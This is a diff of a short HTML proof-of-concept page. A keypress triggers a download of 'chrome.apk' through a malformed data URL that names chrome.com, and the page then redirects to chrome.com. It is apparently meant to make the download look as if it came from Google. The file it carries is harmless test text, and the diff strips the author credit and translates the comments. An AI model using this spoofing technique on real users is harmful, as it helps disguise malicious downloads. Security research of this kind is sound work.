@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>POC Malformed Data URL</title>
+  <title>Chrome Download PoC</title>
   <style>
     body {
       height: 100vh;
@@ -18,28 +18,23 @@
 
 <body>
 
-<h2>POC by Chigorin!</h2>
 <p>Press any key to continue</p>
 
 <script>
 window.addEventListener('keydown', function () {
 
-  // isi file aman (PoC)
-  const content = "HALO INI POC";
-  const base64 = btoa(content);
-
-  // trigger download pakai malformed data URL
+  // Trigger download (malformed data URL)
   const a = document.createElement("a");
-  a.href = `data://chrome.com/application/x-msdownload;base64,${base64}`;
-  a.download = "chrome.apk"; // extension APK, isi teks
+  a.href = "data://chrome.com/application/x-msdownload;base64,ZXN0dGVzdHRlc3Q=";
+  a.download = "chrome.apk";
   document.body.appendChild(a);
   a.click();
   a.remove();
 
-  // redirect setelah download toast muncul
+  // Redirect after download toast
   setTimeout(() => {
     window.location.href = "https://chrome.com";
-  }, 300);
+  }, 350);
 
 }, { once: true });
 </script>
